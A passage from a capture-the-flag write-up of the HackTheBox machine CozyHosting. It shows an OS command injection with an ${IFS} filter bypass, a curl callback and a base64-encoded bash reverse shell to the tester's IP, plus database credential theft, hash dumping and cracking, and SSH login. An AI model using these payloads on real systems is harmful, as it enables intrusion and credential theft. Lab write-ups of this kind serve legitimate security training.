it’s sending a POST request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/executessh</code></span><span class="SemanticString"> with a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">username</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">host</code></span><span class="SemanticString"> parameters:</span></span></p></div><pre id="https://www.notion.so/22555eb4808f4ebb8ff954e4974452f1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+Content-Length: 33
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://cozyhosting.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://cozyhosting.htb/admin
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=C82A15FB1F2D39ABCAC089FB57C44387
+Connection: close
+
+host=localhost&amp;username=kanderson</span></span></span></code></pre><div id="https://www.notion.so/8d4bec065bc04bc78db9b2c53bea0d6e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m guessing that it uses the following OS command to handle SSH connections:</span></span></p></div><pre id="https://www.notion.so/56c9869693d645d1a620f67b5a6a1f33" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token function">ssh</span> <span class="token operator">&lt;</span>username<span class="token operator">></span>@<span class="token operator">&lt;</span>hostname<span class="token operator">></span> <span class="token parameter variable">-i</span> ~/.ssh/id_rsa</span></span></span></code></pre><div id="https://www.notion.so/1e4f542f4a25481f9077b02dfbad2202" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">If this is the case, OS command injection is possible if the parameters are not properly sanitized.</span></span></p></div><div id="https://www.notion.so/cb3999375f284cbe95c2190c392180e7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/d711f6cfd9ba4b2fa259509f3c8b69eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">OS Command Injection:</strong></span></span></p></div><div id="https://www.notion.so/7ec3541879784aa0b926ffb5ecfa4b17" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To test for this, I’ll append a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">;</code></span><span class="SemanticString"> character at the end of each parameter, and see what the server responds with.</span></span></p></div><div id="https://www.notion.so/84b6e5bef47b4c08a5496a09ef2668e2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">host</code></span><span class="SemanticString">, it returned with “Invalid hostname”, suggesting that there’s some sort of filtering implemented.</span></span></p></div><div id="https://www.notion.so/56944c3a92ad4713b8bd7cde81ea71c2" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb20ed170-2a30-4baf-9833-a83f840f2447%2FUntitled.png?width=1405&amp;table=block&amp;id=56944c3a-92ad-4713-b8bd-7cde81ea71c2"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb20ed170-2a30-4baf-9833-a83f840f2447%2FUntitled.png?width=1405&amp;table=block&amp;id=56944c3a-92ad-4713-b8bd-7cde81ea71c2" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0f650781b2554d9ca0a011a24c1e6a7d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">username</code></span><span class="SemanticString"> however, a completely different error was returned:</span></span></p></div><div id="https://www.notion.so/ee05d7865334408ba2d3f42f97ac9cc5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F325939d2-1794-40e1-84f4-4b008922002a%2FUntitled.png?width=1622&amp;table=block&amp;id=ee05d786-5334-408b-a2d3-f42f97ac9cc5"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F325939d2-1794-40e1-84f4-4b008922002a%2FUntitled.png?width=1622&amp;table=block&amp;id=ee05d786-5334-408b-a2d3-f42f97ac9cc5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e361d77286e4464280e02f6605624f70" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the error message, it seems like the injected semicolon is breaking the command into two (shown below). The first command failed as SSH attempts to connect to a non-existent host “kanderson”, while the second command attempts to run an executable </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">@localhost</code></span><span class="SemanticString">, which also doesn’t exist.</span></span></p></div><pre id="https://www.notion.so/e15900f301514253b9ad57bd356ab958" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token function">ssh</span> kanderson<span class="token punctuation">;</span>
+@localhost <span class="token parameter variable">-i</span> ~/.ssh/id_rsa</span></span></span></code></pre><div id="https://www.notion.so/1feead27f8e940bfba8b97f984e3adcd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This proved that the semicolon is successfully passed to bash, and command injection is possible here.</span></span></p></div><div id="https://www.notion.so/963a492098b74d49828e5187f1ba7c1e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> command to connect back to my HTTP server, but the server complained about whitespaces:</span></span></p></div><div id="https://www.notion.so/3c7a73a94d21483c93ac285ebfcf3339" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F43e000e1-5084-4903-8d40-53a2b58adbab%2FUntitled.png?width=1477&amp;table=block&amp;id=3c7a73a9-4d21-483c-93ac-285ebfcf3339"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F43e000e1-5084-4903-8d40-53a2b58adbab%2FUntitled.png?width=1477&amp;table=block&amp;id=3c7a73a9-4d21-483c-93ac-285ebfcf3339" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/ae27471d9c914659b49fd025b47d0309" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions">This page</a></span><span class="SemanticString"> provides several techniques for bypassing character blacklisting, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">${IFS}</code></span><span class="SemanticString"> usually works for whitespaces.</span></span></p></div><pre id="https://www.notion.so/0f8ea13cb20247cd96d18ab20df1b538" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">host</span><span class="token operator">=</span>localhost<span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>kanderson<span class="token punctuation">;</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token function">curl</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span>http://10.10.14.96:8000<span class="token punctuation">;</span><span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/f48b078c930741b5bdc7e1d259843e25" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A GET request is detected on my HTTP server, confirming code execution.</span></span></p></div><pre id="https://www.notion.so/c6e279f7a9a64aae9b92bba7068bd064" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> python -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.98.33 - - [23/Feb/2024 00:25:02] &quot;GET / HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/e6fafc04c9824ee8b20e2315f2a4c3e6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a reverse shell, I’ll send a base64 encoded payload:</span></span></p></div><pre id="https://www.notion.so/732b35169c7e414e975131011a3cb85b" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">host</span><span class="token operator">=</span>localhost<span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>kanderson<span class="token punctuation">;</span><span class="token builtin class-name">echo</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token assign-left variable">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0Ljk2LzgwMDEgMD4mMQ</span><span class="token operator">==</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token operator">|</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span>base64<span class="token variable">${<span class="token environment constant">IFS</span>}</span>-d<span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token operator">|</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token function">bash</span><span class="token punctuation">;</span><span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/9e2646fa0a154f7295947e1a49e3cbbd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And the server sends back a shell session as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/face79303b584456869d6413fb400dbd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.96] from (UNKNOWN) [10.129.98.33] 35180
+bash: cannot set terminal process group (1008): Inappropriate ioctl for device
+bash: no job control in this shell
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>app@cozyhosting:/app$</span></mark></span><span class="SemanticString"><span> python3 -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>app@cozyhosting:/app$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1001(app) gid=1001(app) groups=1001(app)</span></span></span></code></pre><div id="https://www.notion.so/057b6dbeb4704b398af624b6f6889ace" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fbd8fe68e2564b4ebe31251db9e34075" class="Divider"></div><h3 id="https://www.notion.so/b939105ab9d84f66baeb7e4b7f1d46f7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/b939105ab9d84f66baeb7e4b7f1d46f7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/e35ed5b9d184491397307604f3f043be" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Source Code:</strong></span></span></p></div><div id="https://www.notion.so/0b1635aadd734060b0ecaf4e2d0adb99" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In the directory I landed in, there’s a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.jar</code></span><span class="SemanticString"> archive, presumably the web app source code:</span></span></p></div><pre id="https://www.notion.so/ba67a3e4ee5e45d58752be4784365e37" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>app@cozyhosting:/app$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 58856
+drwxr-xr-x  2 root root     4096 Aug 14  2023 .
+drwxr-xr-x 19 root root     4096 Aug 14  2023 ..
+-rw-r--r--  1 root root 60259688 Aug 11  2023 cloudhosting-0.0.1.jar</span></span></span></code></pre><div id="https://www.notion.so/7ed8f033d04a43a5b70798b232662a5b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use an </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://www.javadecompilers.com/">online decompiler</a></span><span class="SemanticString"> to extract the archive:</span></span></p></div><div id="https://www.notion.so/c7b91a3277224124897e5f0f09342131" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F56e04039-6186-450c-b578-7eccc5b7e263%2FUntitled.png?width=1359&amp;table=block&amp;id=c7b91a32-7722-4124-897e-5f0f09342131"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F56e04039-6186-450c-b578-7eccc5b7e263%2FUntitled.png?width=1359&amp;table=block&amp;id=c7b91a32-7722-4124-897e-5f0f09342131" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6bfa39cb69434899bf6b3d01041baadf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Inside, I found a config file containing PSQL credentials.</span></span></p></div><div id="https://www.notion.so/85407395814e435cbefce70e4404d58d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">BOOT-INF/classes/application.properties</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/614ff70db0354cf1b4867604968f95b7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&amp;nvzAQ7XxR</span></span></span></code></pre><div id="https://www.notion.so/8a7b00454dd245e6b2a6d2cf8da1a622" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8239dab9f50043dbbb7511b3dd86bddf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">PostGres:</strong></span></span></p></div><div id="https://www.notion.so/7605a8685c134cb6b74f20820ff812b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">psql</code></span><span class="SemanticString"> is installed on the box, so I’ll use it to connect to the database.</span></span></p></div><pre id="https://www.notion.so/18af256ea9ca4c0a8f0e38f9a45da7aa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>app@cozyhosting:/app$</span></mark></span><span class="SemanticString"><span> psql -h localhost -d cozyhosting -U postgres
+
+Password for user postgres: Vg&amp;nvzAQ7XxR
+
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type &quot;help&quot; for help.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>cozyhosting=#</span></mark></span></span></code></pre><div id="https://www.notion.so/4f0c6cd858774a78ad3f1a2b5f2cc45b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/70c00fffd7134b3c898e796eff89cfbf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It took me a while enumerating it, as the Postgres commands are quite different to the more familiar MySQL ones. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql">This page</a></span><span class="SemanticString"> from HackTricks provides a nice cheatsheet for the most useful commands.</span></span></p></div><pre id="https://www.notion.so/03f759c5a8f54622870ec3074f088ddb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>cozyhosting=#</span></mark></span><span class="SemanticString"><span> \d
+
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+              List of relations
+ Schema |     Name     |   Type   |  Owner   
+--------+--------------+----------+----------
+ public | hosts        | table    | postgres
+ public | hosts_id_seq | sequence | postgres
+ public | users        | table    | postgres
+(3 rows)</span></span></span></code></pre><div id="https://www.notion.so/4ebc76308fc14ec3b4a0ac1efacb9789" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s a juicy table called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">users</code></span><span class="SemanticString">, and it contains two password hashes:</span></span></p></div><pre id="https://www.notion.so/67b61c454ade4836997cff2f1dc9d875" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>cozyhosting=#</span></mark></span><span class="SemanticString"><span> SELECT * FROM users;
+
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+   name    |                           password                           | role
+  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)</span></span></span></code></pre><div id="https://www.notion.so/c03d05252e2447ae8c75906333621cd8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I placed both of them in a file and sent it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString">. One of them is cracked to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">manchesterunited</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/ca8789ecd6fa4ef392c2973641d35ad8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>manchesterunited (?)</span></mark></span><span class="SemanticString"><span>  
+1g 0:00:00:22 0.05% (ETA: 13:35:34) 0.04416g/s 375.2p/s 502.4c/s 502.4C/s 474747..brigitte
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session aborted</span></span></span></code></pre><div id="https://www.notion.so/3181e2ea6ba24e478d7bde0752f10062" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/passwd</code></span><span class="SemanticString">, I’ll find that the only other console user is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">josh</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/ad659e2a918848d689979879cdd25488" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>app@cozyhosting:/app$</span></mark></span><span class="SemanticString"><span> cat /etc/passwd | grep -v false | grep -v nologin
+
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+app:x:1001:1001::/home/app:/bin/sh
+postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+josh:x:1003:1003::/home/josh:/usr/bin/bash</span></span></span></code></pre><div id="https://www.notion.so/672754f54bf543ada8c507c1acdd1259" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And with the password, I can SSH in and grab the user flag.</span></span></p></div><pre id="https://www.notion.so/b1356840798c46709d722f4d262cfff0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> ssh josh@cozyhosting.htb
+
+Warning: Permanently added &#x27;cozyhosting.htb&#x27; (ED25519) to the list of known hosts.
+josh@cozyhosting.htb&#x27;s password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Feb 22 02:48:10 PM UTC 2024
+
+  System load:           0.0
+  Usage of /:            54.3% of 5.42GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             239
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.98.33
+  IPv6 address for eth0: dead:beef::250:56ff:fe96:e8d5
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>josh@cozyhosting:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1003(josh) gid=1003(josh) groups=1003(josh)</span></span></span></code></pre><div id="https://www.notion.so/02a9d33673134fc5bfb9f34c4a55f1f4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/daea74fd47b94447ab8c8e30f4365021" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/99f2ce24d73b4b3097258cabce2b9929" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>josh@cozyhosting:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+ 
+d5ed24c5************************</span></span></span></code></pre><div id="https://www.notion.so/8ff97338192f41409b5cf000e343431f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0a7b10d2192d428d9c5b76aaf4ab98e9" class="Divider"></div><h3 id="https://www.notion.so/b05bdcfa3e654841a45084beeac16c52" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/b05bdcfa3e654841a45084beeac16c52"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">josh</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1c2303ca815a4570ae62217682a31d6d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Sudo Rights:</strong></span></span></p></div><div id="https://www.notion.so/b91b5454613d4526a1aeb9a64def5c37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Root is pretty straightforward. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ssh</code></span><span class="SemanticString"> can be run with sudo:</span></span></p></div><pre id="https://www.notion.so/980fbe792708486399a8f77b0e2f1d84" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>josh@cozyhosting:~$</span></mark></span><span class="SemanticString"><span> sudo -l
+
+[sudo] password for josh: 
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
